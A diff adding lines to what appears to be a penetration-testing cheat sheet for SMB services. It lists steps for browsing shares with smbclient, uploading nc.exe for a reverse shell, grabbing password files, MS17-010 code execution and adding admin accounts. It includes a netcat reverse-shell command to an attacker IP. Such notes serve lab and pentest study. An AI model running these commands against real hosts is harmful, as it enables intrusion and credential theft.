@@ -25,6 +25,18 @@ $ rpcclient -U "" target
 $ enum4linux target        // enum info from Windows and Samba hosts 
 ```
 
+Things to try:
+* Accessing shared dirs: `smbclient \\\\10.11.1.75\\Users`
+    * `smb:\> put src_file remote_file`
+    * `smb:\> get remote_file`
+    * Put nc.exe => reverse shell
+    * Get password files => access via. ssh/ rdp
+* MS17-010 Code Exec
+    * `PsExec.exe`
+    * `runas`
+    * `nc.exe 10.11.0.42 443 -e cmd.exe`
+    * Add new admin account: https://www.securenetworkinc.com/news/2017/9/7/a-guide-to-exploiting-ms17-010-with-metasploit
+
 Exploits:
 * [MS08-067] NetAPI module in Windows SMB
 * [MS17_010] Eternal blue detection: `use auxiliary/scanner/smb/smb_ms17_010`
